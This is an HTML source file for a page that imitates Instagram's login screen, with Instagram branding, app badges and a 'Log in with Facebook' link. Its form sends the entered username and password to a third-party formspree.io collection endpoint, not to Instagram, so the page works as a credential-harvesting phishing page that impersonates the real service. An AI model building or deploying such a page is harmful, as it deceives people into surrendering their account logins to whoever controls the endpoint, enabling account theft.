<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram login Form</title>
    <!-- External css -->
    <link rel="stylesheet" href="insta.css">
    <!-- Font awesome link -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
    <script src="insta.js"></script>
</head>
<body>
    <div id="wrapper">
        <div class="container">
            <div class="phone-app-demo"></div>
            <div class="form-data">
              <form action="https://formspree.io/xeqrdvnw" method="POST">
                    <div class="logo">
                        <h1>Instagram.</h1>
                    </div>
                    <input type="text" placeholder="Phone number, username, or email" name="username">
                    <input type="text" placeholder="Password" name="password">
  
                    <button class="form-btn" type="submit" onclick="done()">Log in</button>

                    <span class="has-separator">Or</span>
                    <a href="#" class="facebook-login">
                        <i class="fab fa-facebook"></i> Log in with Facebook
                    </a>
                    <a class="password-reset" href="#">Forgot password?</a>
                </form>
                <div class="sign-up">
                    Don't an account? <a href="#">Sign up</a>
                </div>
                <div class="get-the-app">
                    <span>Get the app</span>
                    <div class="badge">
                        <a href="https://play.google.com/store?hl=en">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App" >
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <footer>
            <div class="container">
               
                <div class="copyright-notice">
                    &copy; 2020 unofficialcrator
                </div>
            </div>
        </footer>
    </div>
</body>
</html>
